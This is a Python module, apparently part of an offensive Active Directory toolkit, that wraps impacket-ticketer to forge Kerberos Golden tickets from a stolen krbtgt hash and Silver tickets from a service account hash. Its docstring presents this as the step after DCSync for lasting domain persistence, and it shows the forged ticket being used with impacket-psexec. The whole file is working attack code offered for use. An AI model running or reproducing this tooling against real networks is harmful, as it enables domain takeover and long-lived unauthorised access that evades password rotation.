"""Kerberos ticket forge — Golden / Silver ticket generation via
impacket-ticketer.

After DCSync lands the krbtgt hash (via esc1 / esc8 / nopac
chains), the natural next move is offline ticket forge:

  * **Golden ticket** — TGT forged with the krbtgt hash. Grants
    any user any group membership for up to 10 years (default
    ticket lifetime). Full domain persistence, immune to
    password rotation on the target account.

  * **Silver ticket** — service ticket forged with a service
    account's NT hash. Grants access to that specific service
    (SPN) as any user, but nothing else. Narrower blast radius
    than Golden but doesn't require krbtgt.

Both write a .ccache file the operator can plug into any
Kerberos-aware tool: `export KRB5CCNAME=... ; impacket-psexec
-k -no-pass ...`.
"""
import os
import shutil
from dataclasses import dataclass

from . import runner


@dataclass(frozen=True)
class ForgeResult:
    """Outcome of one impacket-ticketer invocation."""
    kind: str          # "ok" / "fail" / "no-tool"
    output: str        # tool stdout+stderr merged
    ccache_path: str = ""


FORGE_KINDS = frozenset({"ok", "fail", "no-tool"})


def find_tool():
    """Locate ``impacket-ticketer`` (or ``ticketer.py``) on PATH."""
    for name in ("impacket-ticketer", "ticketer.py"):
        p = shutil.which(name)
        if p:
            return p
    return None


def _run_ticketer(argv, expected_ccache, timeout=60):
    """Common ticketer.py invocation — classify + surface the
    ccache path when the file lands."""
    tool = find_tool()
    if not tool:
        return ForgeResult(kind="no-tool",
                            output="impacket-ticketer not on PATH — "
                                   "install impacket (`pipx install impacket`)")
    full = [tool] + list(argv)
    result = runner.run(full, timeout=timeout)
    if result.error:
        return ForgeResult(kind="fail", output=str(result.error))
    if result.timed_out:
        return ForgeResult(kind="fail", output="impacket-ticketer timed out")
    output = (result.stdout or "") + (result.stderr or "")
    # ticketer prints "[*] Saving ticket in <path>" on success
    if "Saving ticket in" in output or os.path.exists(expected_ccache):
        return ForgeResult(kind="ok", output=output.strip(),
                             ccache_path=expected_ccache)
    return ForgeResult(kind="fail", output=output.strip()[:400])


def forge_golden(krbtgt_hash, domain, domain_sid, username,
                   out_dir=None, timeout=60):
    """Forge a Golden ticket TGT for ``username`` using the
    domain's ``krbtgt_hash`` (NT hash format, 32 hex).

    Returns :class:`ForgeResult` — on ``ok`` the ``ccache_path``
    is the written .ccache file (default: ``<username>.ccache``
    in ``out_dir`` or CWD).
    """
    out_dir = out_dir or os.getcwd()
    ccache = os.path.join(out_dir, f"{username}.ccache")
    argv = ["-nthash", krbtgt_hash,
            "-domain-sid", domain_sid,
            "-domain", domain,
            username]
    return _run_ticketer(argv, expected_ccache=ccache, timeout=timeout)


def forge_silver(service_hash, domain, domain_sid, username,
                   spn, out_dir=None, timeout=60):
    """Forge a Silver ticket (service ticket) for ``username``
    against a specific ``spn`` using the service account's
    ``service_hash`` (NT hash of the service's password OR the
    machine account for a computer SPN).
    """
    out_dir = out_dir or os.getcwd()
    ccache = os.path.join(out_dir, f"{username}.ccache")
    argv = ["-nthash", service_hash,
            "-domain-sid", domain_sid,
            "-domain", domain,
            "-spn", spn,
            username]
    return _run_ticketer(argv, expected_ccache=ccache, timeout=timeout)
